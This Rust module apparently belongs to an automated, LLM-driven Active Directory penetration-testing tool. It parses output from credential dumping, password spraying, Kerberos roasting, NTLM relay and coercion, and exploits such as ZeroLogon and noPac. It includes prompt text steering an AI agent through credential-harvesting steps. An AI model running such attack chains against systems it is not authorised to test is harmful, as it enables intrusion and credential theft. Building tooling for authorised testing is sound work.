//! Output parsers for tool results.
//!
//! Extract structured discovery data (hosts, open ports, credentials, etc.)
//! from raw CLI tool output without relying on LLM interpretation.

mod bloodhound;
mod certipy;
mod cracker;
mod credential_tools;
mod delegation;
mod lateral;
mod mssql;
mod nmap;
mod ntsd;
mod secrets;
mod smb;
mod spider;
mod trust;
mod users_shares;

use serde_json::{json, Value};

// Re-export all public parser functions at module level.
pub use bloodhound::{
    parse_bloodhound_collection, parse_bloodhound_documents, BLOODHOUND_OUTPUT_DIR_MARKER,
};
pub use certipy::{parse_certipy_esc1_chain, parse_certipy_find, ESC_TYPES};
pub use cracker::parse_cracker_output;
pub use credential_tools::{
    parse_adidnsdump, parse_laps, parse_ldap_descriptions, parse_lsassy, parse_netexec_auth,
    parse_ntds_dit, parse_spray_success,
};
pub use delegation::{
    extract_delegation_account, parse_add_computer, parse_delegation, parse_silver_ticket,
    scrape_added_machine_account, SILVER_TICKET_SPN_MARKER,
};
pub use lateral::{
    parse_mssql_session, parse_remote_exec, parse_smb_share_access, parse_tgt_request,
};
pub use mssql::{parse_mssql_impersonation, parse_mssql_linked_servers};
pub use nmap::{flush_nmap_host, parse_nmap_output};
pub use ntsd::parse_acl_enumeration;
pub use secrets::{
    extract_mssql_hosts_from_kerberoast, parse_asrep_roast, parse_kerberoast, parse_netntlmv2,
    parse_secretsdump,
};
pub use smb::{parse_netexec_smb, parse_smb_signing};
pub use spider::parse_spider_credentials;
pub use trust::parse_domain_trusts;
pub use users_shares::{parse_netexec_shares, parse_netexec_users};

/// Assign `items` to `discoveries[key]` only when non-empty, so absent
/// discovery categories stay off the output object instead of appearing as
/// empty arrays.
fn set_if_nonempty(discoveries: &mut Value, key: &str, items: Vec<Value>) {
    if !items.is_empty() {
        discoveries[key] = Value::Array(items);
    }
}

/// Recover the account ntlmrelayx relayed, most faithful source first: the SMB
/// relay server logs the exact `DOMAIN/ACCOUNT` (trailing `$` intact), whereas
/// the ADCS attack's pfx path and base64 fallback both run through impacket's
/// `_sanitize_filename`, which rewrites `$` and strips it at the end.
fn parse_relayed_account(output: &str) -> Option<String> {
    const AUTH: &str = "Authenticating connection from ";
    const PFX_PATH: &str = "Writing PKCS#12 certificate to ";
    const PFX_B64: &str = "Base64-encoded PKCS#12 certificate (";

    let from_relay = output.lines().find_map(|l| {
        let rest = l.get(l.find(AUTH)? + AUTH.len()..)?;
        if !rest.contains("SUCCEED") {
            return None;
        }
        rest.split('@')
            .next()?
            .rsplit('/')
            .next()
            .map(str::to_string)
    });

    from_relay
        .or_else(|| {
            output.lines().find_map(|l| {
                l.get(l.find(PFX_PATH)? + PFX_PATH.len()..)?
                    .trim()
                    .rsplit(['/', '\\'])
                    .next()
                    .map(|f| f.trim_end_matches(".pfx").to_string())
            })
        })
        .or_else(|| {
            output.lines().find_map(|l| {
                l.get(l.find(PFX_B64)? + PFX_B64.len()..)?
                    .split(')')
                    .next()
                    .map(|f| f.trim_end_matches(".pfx").to_string())
            })
        })
        .filter(|u| !u.is_empty())
}

/// Credential-harvesting tools that run WITHOUT a pre-existing authenticated
/// principal and fall back to a generic, guessed userlist when the caller
/// doesn't seed one. They exit 0 whether or not they find anything, and a
/// zero-yield run is a wall of `[-]` failure lines that reads as "the tool
/// ran fine" — so the LLM re-dispatches the same spray against the same canned
/// wordlist instead of enumerating real accounts. See [`empty_harvest_advisory`].
fn is_unauth_harvest_tool(tool_name: &str) -> bool {
    matches!(
        tool_name,
        "password_spray" | "username_as_password" | "asrep_roast" | "kerberos_user_enum_noauth"
    )
}

/// True when a harvest tool's parsed `discoveries` carry at least one
/// credential, hash, or newly-enumerated user — i.e. the run produced
/// something the operation can act on.
fn harvest_yielded_loot(discoveries: Option<&Value>) -> bool {
    let Some(disc) = discoveries else {
        return false;
    };
    ["credentials", "hashes", "discovered_users"]
        .iter()
        .any(|k| {
            disc.get(*k)
                .and_then(|v| v.as_array())
                .is_some_and(|a| !a.is_empty())
        })
}

/// Advisory appended to an unauthenticated credential-harvest tool's output
/// when the run obtained zero credentials, hashes, and users.
///
/// `password_spray`, `username_as_password`, `asrep_roast`, and
/// `kerberos_user_enum_noauth` return exit-0 "success" regardless of yield, so
/// an empty result is indistinguishable from a productive one in the raw
/// output. Without this note the LLM reads the "success" and keeps dispatching
/// the same technique against the same guessed wordlist — the 20-minute
/// unauthenticated cul-de-sac this guards against. Returns `None` when the
/// tool isn't an unauth harvest tool or when it did yield loot; callers append
/// the returned text to the LLM-facing output on the success path.
pub fn empty_harvest_advisory(tool_name: &str, discoveries: Option<&Value>) -> Option<String> {
    if !is_unauth_harvest_tool(tool_name) || harvest_yielded_loot(discoveries) {
        return None;
    }
    Some(format!(
        "\n\n[ares] {tool_name} completed but obtained 0 credentials, 0 hashes, and 0 new \
         valid users. A zero-yield unauthenticated harvest almost always means the userlist \
         did not match real domain accounts — the built-in fallback wordlist rarely lines up \
         with a target's actual users. Do NOT re-run this technique with the same generic \
         wordlist. Next steps:\n\
         1. Enumerate real accounts first — enumerate_users (SMB RID-brute / LDAP anonymous \
         bind), ldap_search, or a null-session RPC query against the DC.\n\
         2. Re-run AS-REP roasting / spraying with the discovered accounts (pass them via \
         users_file or known_users).\n\
         If you have ALREADY enumerated real users and still got nothing, these accounts \
         resist this vector — pivot to a different technique instead of repeating the spray."
    ))
}

/// Parse raw tool output and return structured discoveries.
///
/// Returns a JSON object with optional `hosts`, `credentials`, `hashes`,
/// `vulnerabilities` arrays that the orchestrator's result_processing can
/// consume directly.
pub fn parse_tool_output(tool_name: &str, output: &str, params: &Value) -> Value {
    let mut discoveries = json!({});

    match tool_name {
        "nmap_scan" => {
            set_if_nonempty(&mut discoveries, "hosts", parse_nmap_output(output, params))
        }
        "smb_signing_check" => {
            set_if_nonempty(&mut discoveries, "hosts", parse_smb_signing(output, params))
        }
        "smb_sweep" => set_if_nonempty(&mut discoveries, "hosts", parse_netexec_smb(output)),
        "enumerate_users" => {
            let mut raw_users = parse_netexec_users(output);

            // Check for embedded credentials (last element with _credentials key)
            if let Some(last) = raw_users.last() {
                if last.get("_credentials").is_some() {
                    if let Some(creds) = last["_credentials"].as_array() {
                        if !creds.is_empty() {
                            discoveries["credentials"] = Value::Array(creds.clone());
                        }
                    }
                    raw_users.pop(); // Remove the _credentials marker
                }
            }

            if !raw_users.is_empty() {
                discoveries["discovered_users"] = Value::Array(raw_users);
            }
        }
        "enumerate_shares" => {
            set_if_nonempty(&mut discoveries, "shares", parse_netexec_shares(output))
        }
        "run_bloodhound" => set_if_nonempty(
            &mut discoveries,
            "vulnerabilities",
            parse_bloodhound_collection(output, params),
        ),
        "secretsdump"
        | "secretsdump_kerberos"
        | "forge_inter_realm_and_dump"
        | "mssql_far_host_secretsdump" => {
            // forge_inter_realm_and_dump runs ticketer + secretsdump in one
            // call. The orchestrator passes `target_domain` so secretsdump
            // hashes get attributed to the dumped (target/parent) realm,
            // not the forging (source/child) realm.
            //
            // mssql_far_host_secretsdump emits standard `impacket-secretsdump
            // LOCAL` output (SAM/SYSTEM/SECURITY hives lifted off a linked
            // cross-forest host over xp_cmdshell). Without this arm its
            // harvested hashes and cached-domain creds fall through to the
            // `_ => {}` default and never land in state — the whole point of
            // the far-host dump. The orchestrator passes `target_domain` =
            // far-host domain so cached/LSA domain creds attribute to the
            // foreign realm that `auto_credential_reuse` then DCSyncs.
            let (hashes, creds) = parse_secretsdump(output, params);
            set_if_nonempty(&mut discoveries, "hashes", hashes);
            set_if_nonempty(&mut discoveries, "credentials", creds);
        }
        "kerberoast" | "targeted_kerberoast" => {
            set_if_nonempty(&mut discoveries, "hashes", parse_kerberoast(output, params));
            // An `MSSQLSvc/<fqdn>` SPN in the roast output proves the host runs
            // SQL Server on 1433 even when no port scan ever reached it —
            // enrich `host.services` so `auto_mssql_detection` can arm the
            // MSSQL automation tree off the kerberoast alone.
            let mssql_hosts = extract_mssql_hosts_from_kerberoast(output);
            set_if_nonempty(&mut discoveries, "hosts", mssql_hosts);
        }
        "asrep_roast" | "kerberos_user_enum_noauth" => {
            set_if_nonempty(
                &mut discoveries,
                "hashes",
                parse_asrep_roast(output, params),
            );
            // Extract valid usernames from GetNPUsers output lines like:
            //   [-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
            //   [-] invalid principal syntax
            // The first pattern confirms a valid AD account.
            let mut valid_users = Vec::new();
            let domain = params.get("domain").and_then(|v| v.as_str()).unwrap_or("");
            for line in output.lines() {
                let line = line.trim();
                if let Some(rest) = line.strip_prefix("[-] User ") {
                    // Match all variants that confirm a valid AD principal:
                    //   [-] User X doesn't have UF_DONT_REQUIRE_PREAUTH set
                    //   [-] User X does not have UF_DONT_REQUIRE_PREAUTH set
                    //   [-] User X is disabled / KDC_ERR_CLIENT_REVOKED
                    let username = rest
                        .strip_suffix(" doesn't have UF_DONT_REQUIRE_PREAUTH set")
                        .or_else(|| rest.strip_suffix(" does not have UF_DONT_REQUIRE_PREAUTH set"))
                        .or_else(|| {
                            if rest.contains("KDC_ERR_CLIENT_REVOKED") {
                                rest.split_whitespace().next()
                            } else {
                                None
                            }
                        });
                    if let Some(username) = username {
                        let username = username.trim();
                        if !username.is_empty() {
                            // GetNPUsers echoes the principal exactly as
                            // supplied; a UPN-form userlist entry (`sam@realm`)
                            // is stored verbatim and later rendered as a doubled
                            // `DOMAIN\sam@realm` in loot. Keep only the
                            // sAMAccountName, and fall back to the UPN realm as
                            // the domain when the task carried none.
                            let (sam, upn_domain) = match username.split_once('@') {
                                Some((s, d)) if !s.is_empty() && d.contains('.') => (s, Some(d)),
                                _ => (username, None),
                            };
                            let user_domain = if domain.is_empty() {
                                upn_domain.unwrap_or(domain)
                            } else {
                                domain
                            };
                            valid_users.push(json!({
                                "username": sam,
                                "domain": user_domain,
                                "source": "kerberos_enum",
                            }));
                        }
                    }
                }
            }
            set_if_nonempty(&mut discoveries, "discovered_users", valid_users);
        }
        "find_delegation" => set_if_nonempty(
            &mut discoveries,
            "vulnerabilities",
            parse_delegation(output, params),
        ),
        "certipy_find" | "certipy_find_anon" => set_if_nonempty(
            &mut discoveries,
            "vulnerabilities",
            parse_certipy_find(output, params),
        ),
        "esc8_relay_probe" => {
            // Any output line starting with `ESC8_CANDIDATE:` — emitted by
            // `esc8_relay_probe` when the CA's `/certsrv/certfnsh.asp`
            // endpoint advertises NTLM — is promoted to a `vuln_type=esc8`
            // vulnerability so `auto_coercion` can queue the PetitPotam +
            // ntlmrelayx chain.
            if output.contains("ESC8_CANDIDATE") {
                let target_ip = params.get("target").and_then(|v| v.as_str()).unwrap_or("");
                let vuln = json!({
                    "vuln_id": format!("esc8_relay:{target_ip}"),
                    "vuln_type": "esc8",
                    "target": target_ip,
                    "discovered_by": "esc8_relay_probe",
                    "details": {
                        "endpoint": "/certsrv/certfnsh.asp",
                        "auth_method": "NTLM",
                        "relay_ready": true,
                    },
                    "recommended_agent": "coercion",
                    "priority": 5,
                });
                discoveries["vulnerabilities"] = Value::Array(vec![vuln]);
            }
        }
        "certipy_esc1_full_chain"
        | "certipy_esc3_full_chain"
        | "certipy_esc4_full_chain"
        | "certipy_esc7_full_chain"
        | "certipy_esc13_full_chain"
        | "certipy_auth" => {
            // All emit "Got hash for 'user@realm': <lm>:<nt>" (certipy auth) and/or
            // the secretsdump `krbtgt:...:::` DCSync line on success.
            set_if_nonempty(
                &mut discoveries,
                "hashes",
                parse_certipy_esc1_chain(output, params),
            );
        }
        "add_computer" => {
            set_if_nonempty(
                &mut discoveries,
                "credentials",
                parse_add_computer(output, params),
            );
        }
        "generate_silver_ticket" => {
            set_if_nonempty(
                &mut discoveries,
                "spns",
                parse_silver_ticket(output, params),
            );
        }
        "lsassy" => {
            let (hashes, creds) = parse_lsassy(output, params);
            set_if_nonempty(&mut discoveries, "hashes", hashes);
            set_if_nonempty(&mut discoveries, "credentials", creds);
        }
        "ntds_dit_extract" => {
            let (hashes, creds) = parse_ntds_dit(output, params);
            set_if_nonempty(&mut discoveries, "hashes", hashes);
            set_if_nonempty(&mut discoveries, "credentials", creds);
        }
        "password_spray" | "smb_login_check" => set_if_nonempty(
            &mut discoveries,
            "credentials",
            parse_spray_success(output, params),
        ),
        "username_as_password" => {
            let creds = parse_spray_success(output, params);
            // Only keep creds where password == username.
            let filtered: Vec<Value> = creds
                .into_iter()
                .filter(|c| {
                    let user = c["username"].as_str().unwrap_or("");
                    let pass = c["password"].as_str().unwrap_or("");
                    !pass.is_empty() && pass.eq_ignore_ascii_case(user)
                })
                .collect();
            set_if_nonempty(&mut discoveries, "credentials", filtered);
        }
        "ldap_search_descriptions" => set_if_nonempty(
            &mut discoveries,
            "credentials",
            parse_ldap_descriptions(output, params),
        ),
        "adidnsdump" => set_if_nonempty(&mut discoveries, "hosts", parse_adidnsdump(output)),
        "mssql_enum_impersonation" => set_if_nonempty(
            &mut discoveries,
            "vulnerabilities",
            parse_mssql_impersonation(output, params),
        ),
        "mssql_enum_linked_servers" => set_if_nonempty(
            &mut discoveries,
            "vulnerabilities",
            parse_mssql_linked_servers(output, params),
        ),
        "enumerate_domain_trusts" => {
            let trust_values: Vec<Value> = parse_domain_trusts(output)
                .iter()
                .filter_map(|t| serde_json::to_value(t).ok())
                .collect();
            set_if_nonempty(&mut discoveries, "trusted_domains", trust_values);
        }
        "crack_with_hashcat" | "crack_with_john" => set_if_nonempty(
            &mut discoveries,
            "credentials",
            parse_cracker_output(output, params),
        ),
        "sysvol_script_search" | "smbclient_spider" => set_if_nonempty(
            &mut discoveries,
            "credentials",
            parse_spider_credentials(output, params),
        ),
        "ldap_acl_enumeration" => set_if_nonempty(
            &mut discoveries,
            "vulnerabilities",
            parse_acl_enumeration(output, params),
        ),
        "password_policy" => {
            // Password policy is informational metadata, not an exploitable vuln —
            // surfacing it as `vulnerabilities[]` makes the orchestrator route it to
            // the exploit agent, which has no spray tool and dead-ends every time.
            // The lockout/min-length details inform spray cadence elsewhere; we
            // expose them under a dedicated key so consumers can read without the
            // exploit-routing side effect.
            let domain = params.get("domain").and_then(|v| v.as_str()).unwrap_or("");
            let target = params.get("target").and_then(|v| v.as_str()).unwrap_or("");
            if !output.is_empty() && !domain.is_empty() {
                let lockout_threshold = output
                    .lines()
                    .find(|l| l.to_lowercase().contains("account lockout threshold"))
                    .and_then(|l| l.split(':').next_back().map(|s| s.trim().to_string()));
                let min_length = output
                    .lines()
                    .find(|l| l.to_lowercase().contains("minimum password length"))
                    .and_then(|l| l.split(':').next_back().map(|s| s.trim().to_string()));
                let mut details = serde_json::Map::new();
                details.insert("domain".into(), json!(domain));
                details.insert("target_ip".into(), json!(target));
                if let Some(ref lt) = lockout_threshold {
                    details.insert("lockout_threshold".into(), json!(lt));
                }
                if let Some(ref ml) = min_length {
                    details.insert("min_password_length".into(), json!(ml));
                }
                discoveries["password_policies"] = json!([details]);
            }
        }
        "zerologon_check" => {
            // netexec --zerologon emits per-line results. On vulnerable DCs:
            //   SMB     <ip>  445   <host>  VULNERABLE
            //   SMB     <ip>  445   <host>  [+] <host> is vulnerable to Zerologon ...
            // On patched DCs:
            //   SMB     <ip>  445   <host>  Not vulnerable
            //   SMB     <ip>  445   <host>  [-] <host> is not vulnerable
            //
            // Without this parser the netexec output flowed straight to the
            // LLM and the `zerologon` technique never got into state. The
            // exploit (set_empty_pw + secretsdump krbtgt + restore-pw) is
            // destructive enough that ares leaves it to a deliberate operator
            // round, but the *discovery* belongs in `discovered_vulnerabilities`
            // so the scoreboard token / strategy-priority knobs / deep-exploit
            // routing can act on it.
            let dc_ip = params
                .get("dc_ip")
                .or_else(|| params.get("target_ip"))
                .or_else(|| params.get("target"))
                .and_then(|v| v.as_str())
                .unwrap_or("");
            if !dc_ip.is_empty() && is_zerologon_vulnerable(output) {
                let domain = params.get("domain").and_then(|v| v.as_str()).unwrap_or("");
                let hostname = params
                    .get("hostname")
                    .and_then(|v| v.as_str())
                    .unwrap_or("");
                let target_ip_safe = dc_ip.replace('.', "_");
                let mut details = serde_json::Map::new();
                details.insert("target_ip".into(), json!(dc_ip));
                details.insert("cve".into(), json!("CVE-2020-1472"));
                details.insert(
                    "description".into(),
                    json!(format!(
                        "Domain controller {dc_ip} is vulnerable to ZeroLogon (CVE-2020-1472)"
                    )),
                );
                if !domain.is_empty() {
                    details.insert("domain".into(), json!(domain));
                }
                if !hostname.is_empty() {
                    details.insert("hostname".into(), json!(hostname));
                }
                discoveries["vulnerabilities"] = json!([{
                    "vuln_id": format!("zerologon_{target_ip_safe}"),
                    "vuln_type": "zerologon",
                    "target": dc_ip,
                    "discovered_by": "zerologon_check",
                    "priority": 4,
                    "recommended_agent": "privesc",
                    "details": details,
                }]);
            }
        }
        "psexec" | "psexec_kerberos" | "wmiexec" | "wmiexec_kerberos" | "smbexec"
        | "smbexec_kerberos" | "pth_winexe" | "pth_wmic" | "pth_rpcclient" => set_if_nonempty(
            &mut discoveries,
            "hosts",
            parse_remote_exec(tool_name, output, params),
        ),
        "pth_smbclient" => set_if_nonempty(
            &mut discoveries,
            "shares",
            parse_smb_share_access(output, params),
        ),
        "get_tgt" => set_if_nonempty(&mut discoveries, "hosts", parse_tgt_request(output, params)),
        "mssql_command" => set_if_nonempty(
            &mut discoveries,
            "hosts",
            parse_mssql_session(output, params),
        ),
        "evil_winrm" => {
            // A successful session is evidenced by evil-winrm's own banner or
            // its prompt. The previous test also accepted *any* backslash, on
            // the theory that `whoami` prints `DOMAIN\user` — but the stdout of
            // an LLM-chosen command is not evidence of anything, and a single
            // Windows path in a failure message ("Cannot find C:\…") was enough
            // to mint a `winrm_access` vulnerability against a host that
            // refused the connection.
            let target = params.get("target").and_then(|v| v.as_str()).unwrap_or("");
            if output.contains("Evil-WinRM") || output.contains("PS ") {
                discoveries["vulnerabilities"] = json!([{
                    "vuln_id": format!("winrm_access_{}", target.replace('.', "_")),
                    "vuln_type": "winrm_access",
                    "target": target,
                    "details": {
                        "description": format!("WinRM access confirmed on {target}"),
                        "target_ip": target,
                    },
                }]);
            }
        }
        "relay_and_coerce" => {
            // Composite ESC8 tool prints `PFX_FILE=...` and `RELAYED_USER=...`
            // markers when the cert is captured. Convert to a
            // `certificate_obtained` vuln so `auto_certipy_auth` picks it up.
            let pfx_path = output
                .lines()
                .find_map(|l| l.trim().strip_prefix("PFX_FILE="))
                .map(str::trim);
            let relayed_user = output
                .lines()
                .find_map(|l| l.trim().strip_prefix("RELAYED_USER="))
                .map(str::trim);

            if let Some(pfx) = pfx_path {
                // Cert is for the target DC's realm (the relayed identity's
                // home), not the coercion credential's domain. Caller passes
                // `target_domain` for cross-forest cases; fall back to
                // `coerce_domain` for same-forest.
                let target_domain = params
                    .get("target_domain")
                    .and_then(|v| v.as_str())
                    .or_else(|| params.get("coerce_domain").and_then(|v| v.as_str()))
                    .unwrap_or("");
                let coerce_target = params
                    .get("coerce_target")
                    .and_then(|v| v.as_str())
                    .or_else(|| params.get("target_dc").and_then(|v| v.as_str()))
                    .unwrap_or("");
                let user = relayed_user.unwrap_or("");
                let mut details = serde_json::Map::new();
                details.insert("pfx_path".into(), json!(pfx));
                if !target_domain.is_empty() {
                    details.insert("domain".into(), json!(target_domain));
                }
                if !user.is_empty() {
                    details.insert("target_user".into(), json!(user));
                    details.insert("account_name".into(), json!(user));
                }
                if !coerce_target.is_empty() {
                    details.insert("target_ip".into(), json!(coerce_target));
                }
                details.insert("source".into(), json!("relay_and_coerce"));
                details.insert(
                    "description".into(),
                    json!(format!(
                        "ESC8 relay captured certificate for {user} in {target_domain}"
                    )),
                );
                let user_safe = user.replace(['$', '.'], "_");
                let domain_safe = target_domain.replace('.', "_");
                discoveries["vulnerabilities"] = json!([{
                    "vuln_id": format!("certificate_obtained_{user_safe}_{domain_safe}"),
                    "vuln_type": "certificate_obtained",
                    "target": coerce_target,
                    "details": details,
                }]);
            }
        }
        "xfreerdp" => {
            // Detect successful RDP authentication from xfreerdp output.
            let target = params.get("target").and_then(|v| v.as_str()).unwrap_or("");
            // The exit status digit is NOT a success signal: FreeRDP 2 logs
            // `!status` and FreeRDP 3 logs `rc`, so "exit status 0" means
            // success on 2 and failure on 3. Key off the absence of an
            // ERRCONNECT code instead, which is stable across both.
            let success = output.contains("Authentication only, exit status")
                && !output.contains("ERRCONNECT");
            if success {
                discoveries["vulnerabilities"] = json!([{
                    "vuln_id": format!("rdp_access_{}", target.replace('.', "_")),
                    "vuln_type": "rdp_access",
                    "target": target,
                    "details": {
                        "description": format!("RDP access confirmed on {target}"),
                        "target_ip": target,
                    },
                }]);
            }
        }
        "start_responder" | "responder" => {
            // Responder captures NTLMv2-SSP authentications on disk *and* in
            // its foreground stdout. The orchestrator may not see the on-disk
            // logs (worker rootfs vs orchestrator pod), but the stdout buffer
            // is what `parse_tool_output` sees and what the LLM would otherwise
            // try to interpret unstructured. Extract NetNTLMv2 hashes (mode
            // 5600) so `auto_crack_dispatch` enqueues them automatically.
            let hashes = secrets::parse_netntlmv2(output, params, "start_responder");
            if !hashes.is_empty() {
                discoveries["hashes"] = Value::Array(hashes);
            }
        }
        "petitpotam" | "coercer" | "dfscoerce" => {
            // The coercion tools themselves don't capture hashes — they only
            // trigger the target to authenticate outbound. But when invoked in
            // tandem with a Responder/ntlmrelayx listener (which is the only
            // reason to call them), the captured hash often ends up echoed
            // into the same stdout buffer (impacket builds that fold listener
            // output, or the operator running both as one bash chain).
            // Reuse the NetNTLMv2 extractor — best effort — so the captured
            // machine-account hash never gets dropped on the floor.
            let hashes = secrets::parse_netntlmv2(output, params, tool_name);
            if !hashes.is_empty() {
                discoveries["hashes"] = Value::Array(hashes);
            }
        }
        "ntlmrelayx_to_smb"
        | "ntlmrelayx_to_ldaps"
        | "ntlmrelayx_to_adcs"
        | "ntlmrelayx_multirelay" => {
            let mut hashes = secrets::parse_netntlmv2(output, params, tool_name);
            let (sd_hashes, sd_creds) = parse_secretsdump(output, params);
            hashes.extend(sd_hashes);
            set_if_nonempty(&mut discoveries, "hashes", hashes);
            set_if_nonempty(&mut discoveries, "credentials", sd_creds);

            if output.contains("Writing PKCS#12 certificate to ")
                || output.contains("Base64-encoded PKCS#12 certificate (")
                || output.contains("GOT CERTIFICATE!")
            {
                let ca_host = params.get("ca_host").and_then(|v| v.as_str()).unwrap_or("");
                let user = parse_relayed_account(output).unwrap_or_default();
                let user_safe = user.replace(['$', '.'], "_");
                let ca_safe = ca_host.replace('.', "_");
                let mut details = serde_json::Map::new();
                if !user.is_empty() {
                    details.insert("target_user".into(), json!(user));
                    details.insert("account_name".into(), json!(user));
                }
                if !ca_host.is_empty() {
                    details.insert("ca_host".into(), json!(ca_host));
                    details.insert("target_ip".into(), json!(ca_host));
                }
                details.insert("source".into(), json!(tool_name));
                let vuln = json!({
                    "vuln_id": format!("certificate_obtained_{user_safe}_{ca_safe}"),
                    "vuln_type": "certificate_obtained",
                    "target": ca_host,
                    "discovered_by": tool_name,
                    "details": details,
                });
                let mut vulns = discoveries
                    .get("vulnerabilities")
                    .and_then(|v| v.as_array())
                    .cloned()
                    .unwrap_or_default();
                vulns.push(vuln);
                discoveries["vulnerabilities"] = Value::Array(vulns);
            }
        }
        "start_mitm6" => {
            let hashes = secrets::parse_netntlmv2(output, params, "start_mitm6");
            if !hashes.is_empty() {
                discoveries["hashes"] = Value::Array(hashes);
            }
        }
        "mssql_ntlm_coerce" => {
            let hashes = secrets::parse_netntlmv2(output, params, "mssql_ntlm_coerce");
            if !hashes.is_empty() {
                discoveries["hashes"] = Value::Array(hashes);
            }
            let target = params.get("target").and_then(|v| v.as_str()).unwrap_or("");
            let listener_ip = params
                .get("listener_ip")
                .and_then(|v| v.as_str())
                .unwrap_or("");
            if !target.is_empty() && !listener_ip.is_empty() {
                let target_safe = target.replace('.', "_");
                let listener_safe = listener_ip.replace('.', "_");
                let vuln = json!({
                    "vuln_id": format!("mssql_ntlm_coerce_{target_safe}_{listener_safe}"),
                    "vuln_type": "coercion_attempted",
                    "target": target,
                    "discovered_by": "mssql_ntlm_coerce",
                    "details": {
                        "target_ip": target,
                        "listener_ip": listener_ip,
                        "unc_path": format!("\\\\{listener_ip}\\share"),
                        "coercion_method": "xp_dirtree",
                    },
                });
                let mut vulns = discoveries
                    .get("vulnerabilities")
                    .and_then(|v| v.as_array())
                    .cloned()
                    .unwrap_or_default();
                vulns.push(vuln);
                discoveries["vulnerabilities"] = Value::Array(vulns);
            }
        }
        "nopac" => {
            let hashes = parse_certipy_esc1_chain(output, params);
            set_if_nonempty(&mut discoveries, "hashes", hashes);
            if output.contains(".ccache") || output.contains("will try to impersonate") {
                let target_ip = params
                    .get("dc_ip")
                    .or_else(|| params.get("target_ip"))
                    .or_else(|| params.get("target"))
                    .and_then(|v| v.as_str())
                    .unwrap_or("");
                let domain = params.get("domain").and_then(|v| v.as_str()).unwrap_or("");
                let target_safe = target_ip.replace('.', "_");
                let vuln = json!({
                    "vuln_id": format!("nopac_{target_safe}"),
                    "vuln_type": "nopac",
                    "target": target_ip,
                    "discovered_by": "nopac",
                    "details": {
                        "cve": "CVE-2021-42278/CVE-2021-42287",
                        "domain": domain,
                        "target_ip": target_ip,
                        "description": format!("noPac sAMAccountName spoofing exploited against {target_ip}"),
                    },
                });
                let mut vulns = discoveries
                    .get("vulnerabilities")
                    .and_then(|v| v.as_array())
                    .cloned()
                    .unwrap_or_default();
                vulns.push(vuln);
                discoveries["vulnerabilities"] = Value::Array(vulns);
            }
        }
        "printnightmare" => {
            let target = params.get("target").and_then(|v| v.as_str()).unwrap_or("");
            let looks_successful = output.to_lowercase().contains("exploit completed");
            if looks_successful && !target.is_empty() {
                let target_safe = target.replace('.', "_");
                discoveries["vulnerabilities"] = json!([{
                    "vuln_id": format!("printnightmare_{target_safe}"),
                    "vuln_type": "printnightmare",
                    "target": target,
                    "discovered_by": "printnightmare",
                    "details": {
                        "cve": "CVE-2021-1675/CVE-2021-34527",
                        "target_ip": target,
                        "description": format!("PrintNightmare exploited on {target}"),
                    },
                }]);
            }
        }
        "laps_dump" => {
            set_if_nonempty(&mut discoveries, "credentials", parse_laps(output, params));
        }
        "netexec_auth_check" => {
            set_if_nonempty(
                &mut discoveries,
                "hashes",
                parse_netexec_auth(output, params),
            );
        }
        _ => {}
    }

    discoveries
}

/// Merge discoveries from multiple tool outputs.
///
/// Deduplicates hosts by IP, keeping the entry with the most services
/// and preferring entries with `is_dc: true`.
pub fn merge_discoveries(all: &[Value]) -> Value {
    let mut host_map: std::collections::HashMap<String, Value> = std::collections::HashMap::new();
    let mut credentials = Vec::new();
    let mut hashes = Vec::new();
    let mut vulnerabilities = Vec::new();
    let mut discovered_users = Vec::new();
    let mut shares = Vec::new();
    let mut trusted_domains_map: std::collections::HashMap<String, Value> =
        std::collections::HashMap::new();

    for disc in all {
        if let Some(h) = disc.get("hosts").and_then(|v| v.as_array()) {
            for host in h {
                let ip = host.get("ip").and_then(|v| v.as_str()).unwrap_or("");
                if ip.is_empty() {
                    continue;
                }
                match host_map.entry(ip.to_string()) {
                    std::collections::hash_map::Entry::Vacant(e) => {
                        e.insert(host.clone());
                    }
                    std::collections::hash_map::Entry::Occupied(mut e) => {
                        let existing = e.get();
                        let existing_services = existing
                            .get("services")
                            .and_then(|v| v.as_array())
                            .map_or(0, |a| a.len());
                        let new_services = host
                            .get("services")
                            .and_then(|v| v.as_array())
                            .map_or(0, |a| a.len());
                        let existing_is_dc = existing
                            .get("is_dc")
                            .and_then(|v| v.as_bool())
                            .unwrap_or(false);
                        let new_is_dc =
                            host.get("is_dc").and_then(|v| v.as_bool()).unwrap_or(false);
                        let owned = [existing, host]
                            .iter()
                            .any(|h| h.get("owned").and_then(|v| v.as_bool()).unwrap_or(false));

                        // Replace if new entry has DC status or more services
                        if (new_is_dc && !existing_is_dc) || new_services > existing_services {
                            e.insert(host.clone());
                        }
                        if owned {
                            if let Some(obj) = e.get_mut().as_object_mut() {
                                obj.insert("owned".into(), Value::Bool(true));
                            }
                        }
                    }
                }
            }
        }
        if let Some(c) = disc.get("credentials").and_then(|v| v.as_array()) {
            credentials.extend(c.iter().cloned());
        }
        if let Some(h) = disc.get("hashes").and_then(|v| v.as_array()) {
            hashes.extend(h.iter().cloned());
        }
        if let Some(v) = disc.get("vulnerabilities").and_then(|v| v.as_array()) {
            vulnerabilities.extend(v.iter().cloned());
        }
        if let Some(u) = disc.get("discovered_users").and_then(|v| v.as_array()) {
            discovered_users.extend(u.iter().cloned());
        }
        if let Some(s) = disc.get("shares").and_then(|v| v.as_array()) {
            shares.extend(s.iter().cloned());
        }
        if let Some(t) = disc.get("trusted_domains").and_then(|v| v.as_array()) {
            for trust in t {
                let domain = trust.get("domain").and_then(|v| v.as_str()).unwrap_or("");
                if !domain.is_empty() {
                    trusted_domains_map
                        .entry(domain.to_string())
                        .or_insert_with(|| trust.clone());
                }
            }
        }
    }

    let mut merged = json!({});
    set_if_nonempty(&mut merged, "hosts", host_map.into_values().collect());
    set_if_nonempty(&mut merged, "credentials", credentials);
    set_if_nonempty(&mut merged, "hashes", hashes);
    set_if_nonempty(&mut merged, "vulnerabilities", vulnerabilities);
    set_if_nonempty(&mut merged, "discovered_users", discovered_users);
    set_if_nonempty(&mut merged, "shares", shares);
    set_if_nonempty(
        &mut merged,
        "trusted_domains",
        trusted_domains_map.into_values().collect(),
    );
    merged
}

fn looks_like_ip(s: &str) -> bool {
    looks_like_ip_pub(s)
}

/// Detect a positive ZeroLogon (CVE-2020-1472) verdict in `zerologon_check`
/// tool output. The tool is `netexec smb <dc> -M zerologon`; success markers
/// vary by netexec version but always include the literal `VULNERABLE` token
/// or an explicit "vulnerable to Zerologon" phrase. Patched DCs emit the
/// negative `Not vulnerable` / "not vulnerable" markers, which we must
